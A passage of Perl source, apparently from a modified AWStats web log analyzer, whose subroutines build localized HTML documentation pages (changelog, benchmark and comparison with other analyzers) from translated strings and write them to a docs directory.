0.2s,box-shadow 0.2s}.version-content:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.version-header{display:flex;align-items:center;gap:12px;margin-bottom:15px;flex-wrap:wrap}.version-tag{font-size:1.3em;font-weight:700;color:var(--timeline-color)}.version-badge{background:var(--timeline-color);color:white;padding:4px 12px;border-radius:20px;font-size:0.85em;font-weight:500}.version-items{list-style:none;margin:0;padding:0}.version-items li{margin:8px 0;padding:10px 15px 10px 40px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;position:relative;transition:all 0.2s ease}.version-items li:hover{transform:translateX(5px);background-color:var(--border-color);box-shadow:0 4px 8px rgba(0,0,0,0.1)}.version-items li::before{content:"•";position:absolute;left:15px;color:var(--timeline-color);font-weight:bold;font-size:1.2rem}.version-items li em{color:var(--timeline-color);font-style:italic}.series-8 .version-items li{border-left:4px solid var(--series-8)}.series-7 .version-items li{border-left:4px solid var(--series-7)}.series-6 .version-items li{border-left:4px solid var(--series-6)}.series-5 .version-items li{border-left:4px solid var(--series-5)}.series-4 .version-items li{border-left:4px solid var(--series-4)}.series-3 .version-items li{border-left:4px solid var(--series-3)}.series-2 .version-items li{border-left:4px solid var(--series-2)}.series-1 .version-items li{border-left:4px solid var(--series-1)}.series-early .version-items li{border-left:4px solid var(--series-early)}.early-stage{margin:40px 0 20px 180px;padding:20px;background:var(--header-bg);border:1px solid var(--border-color);border-radius:12px;border-left:4px solid var(--series-early)}.early-stage h3{margin-top:0;color:var(--series-early)}.early-stage ul{margin:10px 0 0;padding-left:20px}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}.footer-note{margin-top:40px;padding:20px;background:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);text-align:center;font-size:0.95em;opacity:0.8}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    <div class="warning">$warning</div>
    <div class="timeline">
        <div class="series-header series-8">$series_8_title</div>
        <div class="version-item">
            <div class="version-date">$changelog_8_1_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_8_1_version</span>
                    <span class="version-badge" style="background: var(--series-8);">重构版</span>
                </div>
                <ul class="version-items">
                    $changelog_8_1_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_8_0_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_8_0_version</span>
                    <span class="version-badge" style="background: var(--series-8);">最终版本</span>
                </div>
                <ul class="version-items">
                    $changelog_8_0_items
                </ul>
            </div>
        </div>
        
        <div class="series-header series-7">$series_7_title</div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_9_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_9_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_9_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_8_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_8_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_8_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_7_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_7_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_7_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_6_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_6_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_6_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_5_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_5_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_5_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_4_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_4_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_4_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_3_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_3_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_3_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_2_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_2_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_2_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_1_1_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_1_1_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_1_1_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_1_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_1_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_1_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_7_0_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_7_0_version</span>
                </div>
                <ul class="version-items">
                    $changelog_7_0_items
                </ul>
            </div>
        </div>
        
        <div class="series-header series-6">$series_6_title</div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_95_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_95_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_95_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_9_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_9_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_9_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_8_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_8_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_8_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_7_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_7_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_7_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_6_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_6_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_6_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_5_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_5_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_5_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_4_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_4_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_4_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_3_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_3_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_3_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_2_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_2_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_2_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_1_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_1_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_1_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_6_0_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_6_0_version</span>
                </div>
                <ul class="version-items">
                    $changelog_6_0_items
                </ul>
            </div>
        </div>
        
        <div class="series-header series-5">$series_5_title</div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_9_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_9_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_9_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_8_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_8_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_8_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_7_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_7_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_7_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_6_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_6_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_6_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_5_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_5_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_5_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_4_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_4_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_4_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_3_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_3_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_3_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_2_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_2_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_2_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_1_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_1_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_1_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_5_0_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_5_0_version</span>
                </div>
                <ul class="version-items">
                    $changelog_5_0_items
                </ul>
            </div>
        </div>
        
        <div class="series-header series-4">$series_4_title</div>
        
        <div class="version-item">
            <div class="version-date">$changelog_4_1_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_4_1_version</span>
                </div>
                <ul class="version-items">
                    $changelog_4_1_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_4_0_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_4_0_version</span>
                </div>
                <ul class="version-items">
                    $changelog_4_0_items
                </ul>
            </div>
        </div>
        
        <div class="series-header series-3">$series_3_title</div>
        
        <div class="version-item">
            <div class="version-date">$changelog_3_2_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_3_2_version</span>
                </div>
                <ul class="version-items">
                    $changelog_3_2_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_3_1_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_3_1_version</span>
                </div>
                <ul class="version-items">
                    $changelog_3_1_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_3_0_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_3_0_version</span>
                </div>
                <ul class="version-items">
                    $changelog_3_0_items
                </ul>
            </div>
        </div>
        
        <div class="series-header series-2">$series_2_title</div>
        
        <div class="version-item">
            <div class="version-date">$changelog_2_24_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_2_24_version</span>
                </div>
                <ul class="version-items">
                    $changelog_2_24_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_2_23_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_2_23_version</span>
                </div>
                <ul class="version-items">
                    $changelog_2_23_items
                </ul>
            </div>
        </div>
        
        <div class="version-item">
            <div class="version-date">$changelog_2_1_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_2_1_version</span>
                </div>
                <ul class="version-items">
                    $changelog_2_1_items
                </ul>
            </div>
        </div>
        
        <div class="series-header series-1">$series_1_title</div>
        
        <div class="version-item">
            <div class="version-date">$changelog_1_0_date</div>
            <div class="version-marker"></div>
            <div class="version-content">
                <div class="version-header">
                    <span class="version-tag">$changelog_1_0_version</span>
                </div>
                <ul class="version-items">
                    $changelog_1_0_items
                </ul>
            </div>
        </div>
        
        <div class="early-stage">
            <h3 class="series-early">$series_early_title</h3>
            <ul>
                $early_items
            </ul>
        </div>
    </div>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_changelog.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_changelog.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 benchmark 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_benchmark_doc {
    my ($dir) = @_;
    
    
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $theme_script = get_theme_script();
    # 文档标题和副标题
    my $doc_title = _t("docs.benchmark.title");
    my $subtitle = _t("docs.benchmark.subtitle");
    my $intro = _t("docs.benchmark.intro");
    my $SPONSOR_SECTION = _t("sponsor.section");
    my $full_title = "$doc_title - $page_title";
    my $content = _t("docs.benchmark.content");
	$content =~ s/\\n/\n/g;
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, benchmark, speed, dns, performance">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--table-header-bg:#1e40af;--table-header-text:#ffffff;--table-border:#d1d5db;--table-stripe:#f3f4f6;--table-hover:#e2e8f0;--warning-bg:#fff3cd;--warning-border:#ffeeba;--warning-color:#856404;--star-color:#fbbf24;--accent:#2563eb;--card-bg:#ffffff;--important-bg:#fee2e2;--important-border:#ef4444}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--table-header-bg:#1e3a8a;--table-header-text:#ffffff;--table-border:#4b5563;--table-stripe:#2d3748;--table-hover:#374151;--warning-bg:#332e1c;--warning-border:#665c2c;--warning-color:#ffd966;--star-color:#fbbf24;--accent:#60a5fa;--card-bg:#1f2937;--important-bg:#451a1a;--important-border:#ef4444}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3{color:var(--text-color);border-bottom:2px solid var(--border-color);padding-bottom:10px}h1{font-size:2em}h2{font-size:1.5em;margin-top:30px}h3{font-size:1.3em}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap}.doc-nav a{padding:5px 10px;border-radius:4px}.doc-nav a:hover{background-color:var(--border-color);text-decoration:none}.warning-box{background-color:var(--warning-bg);border:1px solid var(--warning-border);color:var(--warning-color);padding:15px;border-radius:8px;margin:20px 0;font-weight:500}.benchmark-table{width:100%;border-collapse:collapse;margin:25px 0;font-size:0.95em;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1),0 2px 4px -1px rgba(0,0,0,0.06);border-radius:12px;overflow:hidden}.benchmark-table th{background-color:var(--table-header-bg);color:var(--table-header-text);border:1px solid var(--table-border);padding:14px 8px;text-align:center;font-weight:600;font-size:0.95em;white-space:nowrap}.benchmark-table td{border:1px solid var(--table-border);padding:12px 8px;vertical-align:top;background-color:var(--bg-color)}.benchmark-table tr:nth-child(even) td{background-color:var(--table-stripe)}.benchmark-table tr:hover td{background-color:var(--table-hover);transition:background-color 0.15s ease}.benchmark-table tr td:nth-child(3):contains("1"){font-weight:600;color:#dc2626}.benchmark-table tr:last-child td{background-color:var(--important-bg);font-weight:500;text-align:center;font-style:italic}.benchmark-table td br + span{font-size:0.9em;opacity:0.8}.table-notes{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border-left:4px solid var(--link-color)}.table-notes p{margin:8px 0;font-size:0.9em}.table-notes p.warning{color:#dc2626;font-weight:600;background-color:var(--warning-bg);padding:8px 12px;border-radius:6px;border-left:4px solid #dc2626}.benchmark-details{background-color:var(--header-bg);padding:20px;border-radius:12px;margin:20px 0;border:1px solid var(--border-color);display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:15px}.benchmark-details p{margin:0;padding:8px;background-color:var(--bg-color);border-radius:6px}.benchmark-details p strong{color:var(--link-color);margin-right:8px}.important-list{list-style:none;padding:0}.important-list li{margin:12px 0;padding:12px 15px;background-color:var(--header-bg);border-radius:8px;border-left:4px solid var(--link-color)}.important-list li.warning{border-left-color:#dc2626;background-color:var(--warning-bg)}.important-list li b{color:var(--link-color)}.dns-content{background-color:var(--warning-bg);padding:20px;border-radius:12px;margin:20px 0;border:1px solid var(--warning-border)}.dns-content p{margin:0;font-size:1.05em}.dns-content b{color:#dc2626;font-size:1.2em}.advices-list{list-style:none;padding:0}.advices-list li{margin:15px 0;padding:15px 20px;background-color:var(--header-bg);border-radius:10px;border:1px solid var(--border-color);transition:transform 0.2s,box-shadow 0.2s}.advices-list li:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.advices-list li b{color:var(--link-color)}.star{color:var(--star-color);font-size:1.2em;letter-spacing:2px;margin-right:10px}.note{font-size:0.9em;color:var(--text-color);opacity:0.8;margin-top:10px;font-style:italic}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em;border:1px solid var(--border-color)}\@media (max-width:768px){.benchmark-table{display:block;overflow-x:auto;white-space:nowrap}.benchmark-details{grid-template-columns:1fr}.advices-list li{padding:12px}}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="note">$subtitle</div>
	<div class="section">
		$content
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_benchmark.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_benchmark.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 compare 文档页面 (完整版)
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_compare_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.compare.title");
    my $subtitle = _t("docs.compare.subtitle");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 表格头部 ==========
    my $compare_table = _t("compare.table.full");
    # ========== 注释 ==========
    my $note_browsers = _t("compare.note.browsers");
    my $note_robots = _t("compare.note.robots");
    my $note_searchengines = _t("compare.note.searchengines");
    my $note_benchmark = _t("compare.note.benchmark");
    my $note_visitors = _t("compare.note.visitors");
    my $note_data = _t("compare.note.data");
    my $note_logformat = _t("compare.note.logformat");
		$note_logformat =~ s/\\n/\n/g;
		$note_logformat =~ s/\\\$/\$/g;
    # ========== 页脚 ==========
    my $footer_author = _t("compare.footer.author");
    my $footer_twitter = _t("compare.footer.twitter");
    my $footer_sponsor = _t("compare.footer.sponsor");
    
    # ========== 行内通用值 ==========
    my $apache_common_note = _t("compare.value.apache.common.note");
    my $scheduler_common = _t("compare.value.scheduler.common");
    my $benchmark_dns = _t("compare.value.benchmark.dns");
    my $visits_basis = _t("compare.value.visits.basis");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    # 构建 HTML
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, compare, analog, webalizer, sawmill, log analyzer">
    <title>$full_title</title>
    <style>
	.compare-table{width:100%;border-collapse:collapse;margin:20px 0;font-size:0.95em;border:1px solid var(--border-color);border-radius:12px;overflow:hidden}.compare-table th{background-color:var(--table-header-bg);color:var(--text-color);padding:12px 8px;text-align:center;font-weight:600;border:1px solid var(--border-color)}.compare-table td{border:1px solid var(--border-color);padding:10px 8px;vertical-align:top}.compare-table tr:nth-child(even){background-color:var(--header-bg)}.compare-table tr:hover{background-color:var(--border-color)}.feature-left{font-weight:600;text-align:left;background-color:var(--header-bg);white-space:nowrap}.feature-yes{color:#059669;font-weight:600}.feature-no{color:#dc2626;font-weight:600}.note-section{margin:30px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:12px}.note-section{margin:30px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:12px}.note-section ul{margin:0;padding:0;list-style:none}.note-section li{margin:15px 0;padding:12px 20px 12px 40px;line-height:1.6;font-size:0.95em;position:relative;border-radius:8px;transition:transform 0.2s}.note-section li:hover{transform:translateX(5px)}.note-browsers{background-color:rgba(59,130,246,0.1);border-left:4px solid #3b82f6}.note-browsers::before{content:"*";color:#3b82f6;font-weight:bold;font-size:1.5em;position:absolute;left:15px;top:10px}.note-robots{background-color:rgba(16,185,129,0.1);border-left:4px solid #10b981}.note-robots::before{content:"**";color:#10b981;font-weight:bold;font-size:1.2em;position:absolute;left:12px;top:12px}.note-searchengines{background-color:rgba(245,158,11,0.1);border-left:4px solid #f59e0b}.note-searchengines::before{content:"***";color:#f59e0b;font-weight:bold;font-size:1.2em;position:absolute;left:12px;top:12px}.note-benchmark{background-color:rgba(239,68,68,0.1);border-left:4px solid #ef4444}.note-benchmark::before{content:"****";color:#ef4444;font-weight:bold;font-size:1.1em;position:absolute;left:10px;top:12px}.note-visitors{background-color:rgba(139,92,246,0.1);border-left:4px solid #8b5cf6}.note-visitors::before{content:"*****";color:#8b5cf6;font-weight:bold;font-size:1.1em;position:absolute;left:8px;top:12px}.note-data{background-color:rgba(236,72,153,0.1);border-left:4px solid #ec4899}.note-data::before{content:"(a)";color:#ec4899;font-weight:bold;font-size:1.1em;position:absolute;left:12px;top:12px}.note-logformat{background-color:rgba(168,85,247,0.1);border-left:4px solid #a855f7}.note-logformat::before{content:"(b)";color:#a855f7;font-weight:bold;font-size:1.1em;position:absolute;left:12px;top:12px}[data-theme="dark"] .note-browsers{background-color:rgba(59,130,246,0.2)}[data-theme="dark"] .note-robots{background-color:rgba(16,185,129,0.2)}[data-theme="dark"] .note-searchengines{background-color:rgba(245,158,11,0.2)}[data-theme="dark"] .note-benchmark{background-color:rgba(239,68,68,0.2)}[data-theme="dark"] .note-visitors{background-color:rgba(139,92,246,0.2)}[data-theme="dark"] .note-data{background-color:rgba(236,72,153,0.2)}[data-theme="dark"] .note-logformat{background-color:rgba(168,85,247,0.2)}:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--table-header-bg:#e5e7eb;--table-border:#d1d5db;--warning-bg:#fff3cd;--warning-border:#ffeeba;--warning-color:#856404;--star-color:#fbbf24}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--table-header-bg:#2d3748;--table-border:#4b5563;--warning-bg:#332e1c;--warning-border:#665c2c;--warning-color:#ffd966;--star-color:#fbbf24}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}h1{font-size:2em}h2{font-size:1.5em;margin-top:30px}h3{font-size:1.3em}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap}.doc-nav a{padding:5px 10px;border-radius:4px}.doc-nav a:hover{background-color:var(--border-color)}.warning-box{background-color:var(--warning-bg);border:1px solid var(--warning-border);color:var(--warning-color);padding:15px;border-radius:8px;margin:20px 0}.compare-table{width:100%;border-collapse:collapse;margin:20px 0;font-size:0.95em}.compare-table th{background-color:var(--table-header-bg);border:1px solid var(--table-border);padding:12px 8px;text-align:center;font-weight:600}.compare-table td{border:1px solid var(--table-border);padding:10px 8px;vertical-align:top}.compare-table tr:nth-child(even){background-color:var(--header-bg)}.compare-table tr:hover{background-color:var(--border-color)}.note{font-size:0.9em;color:var(--text-color);opacity:0.8;margin-top:10px}.advice-item{margin:15px 0;padding:10px;background-color:var(--header-bg);border-radius:8px;border-left:4px solid var(--link-color)}.star{color:var(--star-color);font-size:1.2em}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
	li pre {
		background-color: var(--code-bg);
		padding: 16px;
		border-radius: 8px;
		border: 1px solid var(--border-color);
		margin: 15px 0;
		transition: all 0.3s ease;
		width: calc(100% - 32px);
		margin-left: 0;
		margin-right: 0;
		white-space: pre;
		overflow-x: auto;
		overflow-y: hidden;
		-webkit-overflow-scrolling: touch;
	}

	li pre:hover {
		transform: translateY(-2px);
		box-shadow: 0 4px 8px rgba(0,0,0,0.1);
		border-color: var(--accent);
	}

	li pre code {
		white-space: pre;
		display: inline-block;
		min-width: 100%;
		font-family: 'Courier New', monospace;
		font-size: 0.9em;
		line-height: 1.5;
	}
	</style>
</head>
<body>
    <h1>$doc_title</h1>
    <p class="note">$subtitle</p>
    
	<div class="section">
		$compare_table
	</div>
    
	<div class="note-section">
		<ul>
			<li class="note-browsers">$note_browsers</li>
			<li class="note-robots">$note_robots</li>
			<li class="note-searchengines">$note_searchengines</li>
			<li class="note-benchmark">$note_benchmark</li>
			<li class="note-visitors">$note_visitors</li>
			<li class="note-data">$note_data</li>
			<li class="note-logformat">$note_logformat</li>
		</ul>
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_compare.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_compare.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 config 文档页面 (时间线版)
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_config_doc {
